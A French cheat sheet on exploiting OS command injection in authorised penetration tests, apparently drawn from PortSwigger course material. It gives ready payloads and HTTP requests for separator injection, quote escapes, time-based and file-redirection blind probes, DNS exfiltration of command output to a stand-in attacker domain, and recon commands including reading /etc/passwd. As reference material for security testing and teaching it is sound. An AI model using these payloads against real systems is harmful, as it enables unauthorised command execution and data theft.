# Injection de Commandes OS (Command Injection) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre l'exploitation des injections de commandes OS (*OS Command Injection*) en test d'intrusion applicatif autorisé. Le mécanisme central : une entrée utilisateur est concaténée sans validation dans un appel système côté serveur, permettant d'y adjoindre des commandes arbitraires via des métacaractères shell.

**Familles de techniques couvertes :**

- Injection directe (résultat `stdout` visible dans la réponse HTTP).
- Injection aveugle par temporisation (*time-based*).
- Injection aveugle par redirection de sortie (*output redirection*).
- Injection aveugle hors bande (*out-of-band* / OAST via DNS).

**Outils :** Burp Suite (Repeater, Intruder, Collaborator), `curl`, `nslookup`.

**Conditions générales :** techniques applicables sur un endpoint passant des paramètres HTTP à un appel système sous-jacent, en environnement de test autorisé. La technique OAST suppose un accès à un serveur DNS contrôlé (ex. Burp Collaborator ou `interactsh`).

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.exemple` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `PARAM` | Nom du paramètre HTTP vulnérable |
| `kgji2ohoyw.web-attacker.com` | Domaine OOB contrôlé par l'auditeur (Burp Collaborator / `interactsh`), à remplacer |
| `/var/www/static/` | Chemin web accessible en lecture — à adapter à l'arborescence réelle de la cible |

> Les techniques de cette fiche ciblent des environnements de test ou des labs (PortSwigger, HackTheBox…). Ne jamais les appliquer sans autorisation écrite.

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Confirmer une injection directe | `& echo abc123 &` | Réponse HTTP susceptible de refléter une sortie commande | Chaîne `abc123` apparaissant dans la réponse | La sortie n'est visible que si l'application l'inclut dans la réponse HTTP |
| Confirmer une injection aveugle | `& ping -c 10 127.0.0.1 &` (Linux) / `& timeout /t 10 &` (Windows) | Pas de sortie visible dans la réponse HTTP | Délai de réponse d'environ 10 secondes | Bruit réseau pouvant masquer ou imiter le délai ; nécessite une baseline |
| Exfiltrer un résultat (blind) | `& whoami > /var/www/static/out.txt &` | Chemin accessible en écriture et en lecture HTTP | Contenu du fichier lisible via `GET /static/out.txt` | Nécessite de connaître un chemin en écriture ET accessible publiquement |
| Confirmer une injection aveugle OOB | `& nslookup kgji2ohoyw.web-attacker.com &` | Toute injection aveugle, surtout quand redirection et timing sont inopérants | Requête DNS entrante sur le serveur contrôlé | Nécessite un serveur DNS OOB et une sortie réseau autorisée depuis le serveur cible |
| Exfiltrer des données via DNS | `& nslookup $(whoami).kgji2ohoyw.web-attacker.com &` | Injection OOB confirmée, données courtes à exfiltrer | Sous-domaine interrogé contenant le résultat de la commande | Longueur limitée d'un label DNS ; certains caractères invalides dans un nom de domaine |
| Sortir d'un contexte quoté | `" ; whoami ; "` ou `' ; whoami ; '` | Entrée encadrée de guillemets dans l'appel système | La commande injectée est exécutée en dehors du guillemage | Dépend du type de guillemet utilisé côté serveur |
| Injection quand `&` / `;` sont filtrés | `$(whoami)` / `` `whoami` `` | Séparateurs classiques bloqués | Résultat de la commande substitué dans l'argument | Nécessite un shell bash/sh interprétant la substitution |

---

## 3. Techniques classées par objectif

### 3.1 Détecter

#### Injection directe — confirmation par chaîne neutre

**Objectif :** établir sans ambiguïté qu'une commande injectée est exécutée côté serveur et que sa sortie est reflétée dans la réponse HTTP.

**Quand l'utiliser :** tout paramètre HTTP transmis à un appel système sous-jacent visible dans la réponse.

**Prérequis :** un paramètre modifiable identifié sur l'endpoint.

**Syntaxe minimale :**

```http
GET /stockStatus?productID=381&storeID=29%26echo%20abc123%26 HTTP/1.1
Host: cible.exemple
```

Décomposition du payload injecté dans `storeID` :

```text
29%26echo%20abc123%26
  ^                ^
  %26 = & (encodé) | isole la commande injectée
         echo abc123 | commande sans effet de bord
```

**Éléments à personnaliser :** nom et valeur du paramètre (`storeID`), chaîne de confirmation (`abc123` — choisir une valeur unique ne pouvant pas apparaître par coïncidence dans la réponse).

**Signal attendu :** la chaîne `abc123` apparaît dans le corps de la réponse HTTP.

**Interprétation :** la présence de la chaîne dans la réponse prouve l'exécution de la commande et la réflexion de sa sortie. Elle ne prouve pas en elle-même la capacité à exécuter des commandes plus complexes (filtrage possible sur d'autres caractères).

**Limites :** si la sortie n'est pas reflétée (injection aveugle), passer directement aux techniques de la section 3.2.

**Source :** cours fourni, sections 2 et 3.

#### Injection aveugle — détection par temporisation (time-based)

**Objectif :** confirmer l'exécution d'une commande sans sortie visible, en mesurant le délai de réponse induit.

**Quand l'utiliser :** aucune sortie de commande reflétée dans la réponse HTTP.

**Prérequis :** mesurer un délai de référence (baseline) sans payload avant de comparer.

**Syntaxe minimale :**

```bash
# Linux
& ping -c 10 127.0.0.1 &
```

```bash
# Windows
& timeout /t 10 &
```

**Éléments à personnaliser :** valeur du compteur (`-c 10` / `/t 10`) — augmenter pour des réseaux avec latence élevée.

**Signal attendu :** délai de réponse d'environ 10 secondes, nettement supérieur à la baseline.

**Interprétation :** un délai reproductible et corrélé à la valeur du compteur confirme l'injection. Un délai non reproductible ou inférieur à la baseline ne permet pas de conclure.

**Limites :** jitter réseau et charge serveur peuvent simuler ou masquer un délai — toujours répéter la mesure plusieurs fois et disposer d'une baseline fiable.

**Source :** cours fourni, section 5.1.

---

### 3.2 Récupérer une preuve

#### Redirection de sortie vers un fichier accessible publiquement

**Objectif :** récupérer le résultat d'une commande sur un endpoint blind en l'écrivant dans un fichier publiquement lisible.

**Quand l'utiliser :** injection aveugle confirmée (par temporisation), droits en écriture sur le répertoire web supposés.

**Prérequis :** connaître un chemin en écriture situé sous la racine web (dossier `static`, `uploads`, etc.).

**Syntaxe minimale :**

```bash
& whoami > /var/www/static/whoami.txt &
```

Récupération du résultat :

```bash
curl https://cible.exemple/static/whoami.txt
```

**Éléments à personnaliser :** commande à exécuter (`whoami`), chemin de sortie (`/var/www/static/whoami.txt`) — adapter à l'arborescence réelle de la cible.

**Signal attendu :** le contenu du fichier retourne le résultat de la commande (ex. `www-data`).

**Interprétation :** prouve l'exécution de la commande et l'identité de l'utilisateur serveur. L'absence de fichier ne prouve pas l'absence de vulnérabilité — le chemin peut être incorrect ou les droits insuffisants.

**Limites :** nécessite de connaître un chemin en écriture et accessible publiquement ; peut ne pas fonctionner si les droits sur les répertoires web sont restrictifs.

**Source :** cours fourni, section 5.2.

#### Exfiltration OOB via déclenchement DNS

**Objectif :** confirmer l'exécution d'une commande aveugle en déclenchant une résolution DNS vers un serveur contrôlé.

**Quand l'utiliser :** injection aveugle où la redirection de fichier est impossible et le délai n'est pas fiable ; technique de référence pour les environnements les plus filtrants.

**Prérequis :** accès à un serveur DNS OOB (Burp Collaborator, `interactsh`…) ; sortie DNS autorisée depuis le serveur cible.

**Syntaxe minimale (confirmation uniquement) :**

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

**Signal attendu :** requête DNS entrante sur le serveur OOB au moment de l'envoi du payload.

**Interprétation :** confirme l'exécution aveugle avec certitude, sans dépendre d'un signal côté HTTP. Ne produit pas de preuve de contenu par elle-même.

**Limites :** certains réseaux d'entreprise ou hébergements mutualisés bloquent les résolutions DNS sortantes arbitraires — tester sur un lab ou vérifier au préalable que des requêtes DNS sortantes sont possibles.

**Source :** cours fourni, section 5.3.

#### Exfiltration de données via DNS (sous-domaine)

**Objectif :** récupérer le résultat d'une commande aveugle en le concaténant dans le nom de domaine interrogé.

**Quand l'utiliser :** après confirmation OOB, pour exfiltrer une donnée courte (identifiant utilisateur, nom d'hôte).

**Prérequis :** idem que ci-dessus + shell interprétant la substitution de commande `$(...)`.

**Syntaxe minimale :**

```bash
& nslookup $(whoami).kgji2ohoyw.web-attacker.com &
```

**Éléments à personnaliser :** commande à exfiltrer (`whoami`, `hostname`…), domaine OOB.

**Signal attendu :** le sous-domaine de la requête DNS entrante contient le résultat de la commande (ex. `www-data.kgji2ohoyw.web-attacker.com`).

**Interprétation :** constitue une preuve exploitable du contenu de la commande exécutée, directement lisible dans les logs du serveur OOB.

**Limites :** les labels DNS sont limités à 63 caractères ; les caractères non alphanumériques (espaces, `/`…) invalident le nom de domaine — convient aux sorties courtes et simples (`whoami`, `hostname`). Pour des sorties plus longues, utiliser la redirection de fichier ou un exfiltration HTTP OOB.

**Source :** cours fourni, section 5.3.

---

### 3.3 Provoquer un effet contrôlé — Reconnaissance post-injection

**Objectif :** cartographier le contexte d'exécution (utilisateur, OS, réseau, processus) après confirmation de l'injection.

**Quand l'utiliser :** injection confirmée (directe ou aveugle avec sortie récupérable).

**Prérequis :** un canal de récupération opérationnel (réflexion directe, fichier accessible ou sous-domaine DNS).

**Commandes de référence :**

| Objectif | Linux | Windows |
|---|---|---|
| Utilisateur courant | `whoami` | `whoami` |
| Privilèges courants | `id` | `whoami /priv` |
| Version OS | `uname -a` | `ver` |
| Configuration réseau | `ip a` | `ipconfig /all` |
| Connexions actives | `netstat -an` | `netstat -an` |
| Processus en cours | `ps -ef` | `tasklist` |
| Répertoire courant / contenu | `pwd && ls -la` | `cd && dir` |
| Comptes locaux | `cat /etc/passwd` | `net user` |

**Chaînage pour réduire le nombre de requêtes :**

```bash
& whoami && id && uname -a &
```

**Signal attendu :** sortie de chaque commande concaténée dans la réponse ou le fichier de sortie.

**Limites :** le chaînage avec `&&` s'arrête à la première commande échouant — préférer `;` pour une exécution séquentielle inconditionnelle si le contexte le permet.

**Source :** cours fourni, section 4.

---

### 3.4 Adapter — Sortir d'un contexte quoté

**Objectif :** injecter un séparateur lorsque l'entrée utilisateur est encadrée de guillemets dans l'appel système côté serveur.

**Quand l'utiliser :** les séparateurs `&` ou `;` seuls ne produisent aucun effet, suggérant une concaténation dans une chaîne quotée.

**Prérequis :** connaître (ou tester empiriquement) le type de guillemet utilisé côté serveur.

**Syntaxe minimale :**

```bash
" ; whoami ; "
```

```bash
' ; whoami ; '
```

**Éléments à personnaliser :** type de guillemet, séparateur, commande.

**Signal attendu :** exécution de `whoami` malgré l'encadrement de guillemets dans l'appel système.

**Interprétation :** le guillemet de fermeture soumis termine la chaîne originale, permettant au métacaractère suivant d'être interprété comme séparateur de commande.

**Limites :** dépend strictement du type de guillemet utilisé côté applicatif — tester les deux formes (`"` et `'`) si le premier échoue.

**Source :** cours fourni, section 3.3.

---

### 3.5 Contourner une contrainte — Séparateurs filtrés

**Objectif :** injecter une commande lorsque `&`, `;` ou `|` sont bloqués.

**Quand l'utiliser :** les séparateurs classiques sont filtrés mais l'entrée est tout de même passée à un shell bash/sh.

**Prérequis :** shell interprétant la substitution de commande.

**Syntaxe minimale :**

```bash
$(whoami)
```

```bash
`whoami`
```

**Éléments à personnaliser :** commande à exécuter.

**Signal attendu :** résultat de la commande substitué dans l'argument, produisant un comportement observable (erreur d'argument contenant la sortie, ou reflété dans la réponse).

**Interprétation :** la substitution de commande est exécutée par le shell avant même le passage des arguments — elle contourne les filtres sur les séparateurs classiques mais non ceux bloquant les backticks ou le `$`.

**Limites :** sans effet si l'appel système n'invoque pas de shell (ex. `execve()` / `subprocess.run([...], shell=False)`).

**Source :** cours fourni, section 3.2.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte d'insertion | Variante utile | Différence apportée |
|---|---|---|---|---|
| Confirmer une injection directe | `%26echo%20abc123%26` | Paramètre GET/POST passé à un appel système | Remplacer `%26` par `%3b` (`;` encodé) | Teste un séparateur alternatif si `&` est filtré |
| Injection aveugle time-based (Linux) | `%26ping%20-c%2010%20127.0.0.1%26` | Idem | `%26sleep%2010%26` | `sleep` est plus fiable que `ping` si ICMP est bloqué en loopback |
| Injection aveugle time-based (Windows) | `%26timeout%20/t%2010%26` | Idem | — | Un seul payload de référence sur Windows |
| Redirection de sortie | `%26whoami>%2fvar%2fwww%2fstatic%2fout.txt%26` | Idem | Adapter le chemin | Le chemin est la seule variable à ajuster |
| Confirmation OOB (DNS) | `%26nslookup%20kgji2ohoyw.web-attacker.com%26` | Idem | — | Payload de confirmation pure ; aucune donnée exfiltrée |
| Exfiltration OOB (DNS) | `%26nslookup%20$(whoami).kgji2ohoyw.web-attacker.com%26` | Idem | Remplacer `whoami` par `hostname` | Exfiltre le nom d'hôte au lieu de l'utilisateur |
| Sortie de guillemets doubles | `"%20;%20whoami%20;%20"` | Paramètre concaténé dans une chaîne `"..."` | Remplacer `"` par `'` | Teste l'autre type de guillemet |
| Substitution de commande | `$(whoami)` | Paramètre passé à un shell bash/sh | `` `whoami` `` | Syntaxe alternative compatible sh POSIX, évitée dans certains contextes bash modernes |

---

## 5. Encodages, formats et représentation des entrées

| Représentation d'origine | Encodée URL | Contexte pertinent | Composant décodant | Effet attendu |
|---|---|---|---|---|
| `&` | `%26` | Paramètre GET ou POST passé à un shell | Serveur web / framework HTTP | Évite l'interprétation de `&` comme séparateur de paramètre HTTP ; le shell reçoit `&` brut |
| `;` | `%3b` | Idem | Idem | Séparateur d'exécution séquentielle côté shell |
| ` ` (espace) | `%20` | Payload injecté dans un paramètre | Idem | Sépare les arguments de la commande injectée |
| `/` | `%2f` | Chemin dans un payload de redirection | Idem | Permet d'écrire un chemin absolu (`/var/www/...`) sans confusion avec un séparateur de chemin HTTP |
| `\n` | `%0a` | Tout paramètre passé à un interpréteur ligne par ligne | Shell / parseur de ligne | Certains interpréteurs traitent `\n` comme un nouveau segment de commande, similaire à `;` |

**Condition d'inefficacité :** si l'application décode les caractères encodés avant de les filtrer, puis les re-encode avant de les passer au shell, un double-encodage peut être nécessaire. Tester uniquement si le schéma de décodage de l'application est connu — sans hypothèse technique vérifiée, ne pas multiplier les niveaux d'encodage.

---

## 6. Exemples de requêtes HTTP

### 6.1 Injection directe sur un paramètre GET

```http
# Référence — requête légitime
GET /stockStatus?productID=381&storeID=29 HTTP/1.1
Host: cible.exemple
```

```http
# Version modifiée — injection dans storeID
GET /stockStatus?productID=381&storeID=29%26echo%20abc123%26 HTTP/1.1
Host: cible.exemple
```

- **Changement clé :** valeur de `storeID` augmentée de `%26echo%20abc123%26`.
- **Pourquoi important :** le `%26` (= `&`) isole la commande injectée du reste de la ligne de commande shell.
- **Prérequis :** identifier que `storeID` est passé à un appel système sous-jacent.
- **Signal recherché :** la chaîne `abc123` apparaît dans le corps de la réponse HTTP.
- **Ce que cela ne prouve pas seul :** que d'autres séparateurs fonctionnent — tester `%3b` (`;`) ou `%0a` si `%26` produit un comportement inattendu.

### 6.2 Injection aveugle — time-based

```http
# Référence — mesurer la baseline sans payload
POST /feedback HTTP/1.1
Host: cible.exemple
Content-Type: application/x-www-form-urlencoded

email=test@example.com&message=hello
```

```http
# Version modifiée — injection time-based dans email
POST /feedback HTTP/1.1
Host: cible.exemple
Content-Type: application/x-www-form-urlencoded

email=test@example.com%26ping+-c+10+127.0.0.1%26&message=hello
```

- **Changement clé :** `%26ping+-c+10+127.0.0.1%26` ajouté à la valeur du champ `email`.
- **Pourquoi important :** `ping -c 10 127.0.0.1` prend environ 10 secondes (Linux) — délai mesurable sans sortie visible.
- **Prérequis :** mesurer le délai de réponse de la requête de référence avant d'injecter.
- **Signal recherché :** délai de réponse d'environ 10 secondes, reproductible.
- **Ce que cela ne prouve pas seul :** le délai seul ne garantit pas l'injection — confirmer avec `sleep` ou une technique OOB si le délai est ambigu.

### 6.3 Injection aveugle — exfiltration OOB via DNS

```http
# Version modifiée — payload OOB dans email
POST /feedback HTTP/1.1
Host: cible.exemple
Content-Type: application/x-www-form-urlencoded

email=test@example.com%26nslookup+$(whoami).kgji2ohoyw.web-attacker.com%26&message=hello
```

- **Changement clé :** `nslookup $(whoami).kgji2ohoyw.web-attacker.com` injecté via `&` encodés.
- **Pourquoi important :** la substitution `$(whoami)` est résolue par le shell avant `nslookup`, exfiltrant l'utilisateur dans le nom de domaine interrogé.
- **Prérequis :** serveur OOB configuré et en écoute.
- **Signal recherché :** requête DNS entrante sur le serveur OOB avec le sous-domaine correspondant à la sortie de `whoami`.
- **Ce que cela ne prouve pas seul :** la réussite pour `whoami` ne garantit pas que des données plus longues ou avec des caractères spéciaux seront correctement exfiltrées par le même vecteur.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Modification manuelle et renvoi d'une requête unique | Tests ponctuels de payload, injection directe | Modifier la valeur d'un paramètre, envoyer, observer la réponse | Peu adapté aux tests en volume ou à la mesure précise de timing |
| Burp Intruder | Automatisation de payloads multiples sur un paramètre | Enumération de séparateurs, password spraying de commandes de recon | Positionner le payload sur le paramètre cible, charger une liste de séparateurs | Mode cluster bomb si plusieurs positions ; bruyant dans les logs |
| Burp Collaborator | Serveur DNS/HTTP OOB géré par Burp | Détection et exfiltration OOB | Générer un sous-domaine Collaborator, l'insérer dans le payload `nslookup` | Nécessite une licence Burp Pro ; ne pas utiliser sur des cibles sans autorisation explicite |
| `interactsh` | Alternative open-source à Burp Collaborator | Idem, en environnement sans Burp Pro | `interactsh-client` — générer un hôte OOB, l'insérer dans le payload | Nécessite un accès réseau sortant depuis la machine d'audit |
| `curl` | Requêtes HTTP pour récupérer la sortie redirigée vers un fichier | Technique output redirection confirmée | `curl https://cible.exemple/static/out.txt` | Simple récupération HTTP ; non adapté à l'injection elle-même |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Chaîne unique (`abc123`) reflétée dans la réponse | Injection directe confirmée | Injecter une commande différente (`whoami`) pour confirmer l'exécution de commandes arbitraires | Qu'un echo suffit à prouver une commande complexe fonctionne de même |
| Délai de réponse d'environ 10s reproductible | Injection aveugle time-based probable | Faire varier le compteur (`-c 5` vs `-c 10`) et vérifier que le délai varie proportionnellement | Qu'un délai isolé non reproductible est une preuve d'injection |
| Fichier récupérable contenant le résultat de `whoami` | Injection aveugle avec redirection confirmée | Confirmer que le contenu du fichier change si la commande est modifiée | Que l'écriture dans ce chemin implique des droits root — l'utilisateur peut n'être que `www-data` |
| Requête DNS entrante sur le serveur OOB | Injection aveugle OOB confirmée | Exfiltrer `whoami` via sous-domaine pour obtenir une preuve de contenu | Qu'une requête DNS entrante unique (sans corrélation temporelle avec l'envoi du payload) constitue une preuve |
| Requête DNS OOB avec sous-domaine contenant `www-data` | Identité utilisateur serveur exfiltrée | Tester `hostname` ou `id` pour enrichir le contexte | Que `www-data` implique forcément l'absence de privilèges — `sudo` ou SUID peuvent exister |
| Pas d'effet visible malgré injection | Filtrage de séparateurs, absence d'appel shell, ou résultat non réfléchi | Tester systématiquement `;`, `|`, `\n` (`%0a`), `$(...)`, puis passer aux techniques blind | Que l'absence d'effet prouve l'absence de vulnérabilité |

---

## 9. Variantes de syntaxe et adaptation

#### Choisir le bon séparateur selon le contexte

**Problème précis :** un séparateur précis (`&`) ne produit pas d'effet ou est visiblement filtré.

**Pourquoi pertinent :** chaque opérateur a un comportement distinct selon le shell et le contexte ; le filtrage peut être partiel.

**Ordre de test recommandé (un séparateur à la fois) :**

| Séparateur | Encodé URL | À tester si |
|---|---|---|
| `&` | `%26` | Test initial de référence |
| `;` | `%3b` | `&` filtré, shell Unix |
| `\|` | `%7c` | Résultat de la commande précédente exploitable comme entrée |
| `\n` | `%0a` | `;` et `&` filtrés ; interpréteur lisant ligne par ligne |
| `$(...)` | voir note encodage | Séparateurs classiques filtrés, shell bash/sh confirmé |

> **Règle importante :** ne tester qu'un seul séparateur à la fois. Modifier simultanément le séparateur et la commande empêche d'attribuer le résultat à l'une ou l'autre variable.

#### Adapter la technique blind selon les contraintes

**Problème précis :** la première technique blind tentée ne produit aucun signal.

**Ce qui change :** la technique, pas la commande testée.

| Technique | Condition de substitution | Priorité |
|---|---|---|
| Time-based (`ping` / `sleep`) | Toujours disponible | 1re à tester (rapide à confirmer) |
| Redirection de fichier | Droits en écriture + chemin web accessible connu | 2e si timing peu fiable |
| OOB DNS | Sortie réseau DNS autorisée + serveur OOB disponible | Technique de référence pour les environnements les plus filtrants |

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Aucun signal sur injection directe | Sortie de commande non reflétée dans la réponse HTTP, ou séparateur filtré | Passer directement aux techniques blind (time-based) | Tester `%3b`, `%0a`, `$(...)` si `%26` échoue | Que l'absence de sortie ne prouve pas l'absence de vulnérabilité |
| Délai non reproductible (time-based) | Bruit réseau, jitter, charge serveur | Répéter plusieurs fois, comparer à la baseline, faire varier le compteur | Passer à `sleep` si `ping` est inconsistant ; augmenter le compteur pour rendre le signal plus net | Que l'inconsistance ne permet pas encore de conclure — ni dans un sens ni dans l'autre |
| Fichier non lisible après redirection | Chemin incorrect, droits insuffisants, ou WAF bloquant le `>` | Tester un chemin alternatif (`/tmp/`, puis un autre répertoire web) | Passer à la technique OOB si aucun chemin accessible n'est identifiable | Que l'échec de la redirection ne remet pas en cause la vulnérabilité elle-même |
| Pas de requête DNS OOB reçue | DNS sortant bloqué depuis le serveur cible, ou substitution `$()` non interprétée (pas de shell) | Tester d'abord `nslookup` seul (sans substitution) pour isoler la cause | Si DNS bloqué : pivoter vers HTTP OOB si disponible. Si pas de shell : l'appel système n'invoque probablement pas de shell | Que l'absence de callback DNS indique soit un filtrage réseau, soit l'absence d'interpréteur shell |
| Substitution `$(whoami)` sans effet | Shell non invoqué (`execve` / `shell=False`), ou `$` filtré | Tester un séparateur classique (`&`) pour confirmer qu'un shell est bien invoqué | Si pas de shell : la vulnérabilité d'injection de commande est fermée structurellement | Que cette syntaxe de substitution est inutile sans interpréteur shell |
| Guillemets de fermeture sans effet | Type de guillemet incorrect, ou l'entrée est concaténée hors de toute chaîne quotée | Tester l'autre type de guillemet ; tester également un séparateur nu sans guillemet | Revenir à l'injection directe par séparateur si le contexte n'est pas quoté | Que l'absence d'effet peut indiquer un contexte non quoté, pas forcément un filtrage |

---

## 11. Checklist d'utilisation

- [ ] Le paramètre HTTP passant à un appel système a été identifié.
- [ ] Un payload de confirmation neutre (`echo abc123`) a été testé avant toute commande de recon.
- [ ] Si la sortie n'est pas visible, la technique blind time-based est tentée avec une baseline de référence.
- [ ] Un seul séparateur ou une seule variable est modifié(e) à chaque essai.
- [ ] Le signal attendu est défini avant l'envoi du test (réflexion, délai, fichier, callback DNS).
- [ ] La commande et la technique (séparateur / blind) sont variées indépendamment.
- [ ] Un délai ou une requête DNS non reproductible n'est pas documenté comme preuve définitive.
- [ ] Le canal de récupération (fichier, OOB) est confirmé opérationnel avant de chaîner des commandes de recon.
- [ ] Les commandes de recon sont adaptées à l'OS cible (Linux vs Windows).
- [ ] Les résultats importants sont reproduits avant d'être documentés comme findings.

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Testing Guide — Testing for OS Command Injection (WSTG-INPV-12)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [Burp Suite Collaborator — documentation officielle](https://portswigger.net/burp/documentation/collaborator)
- [interactsh — client OOB open-source (ProjectDiscovery)](https://github.com/projectdiscovery/interactsh)
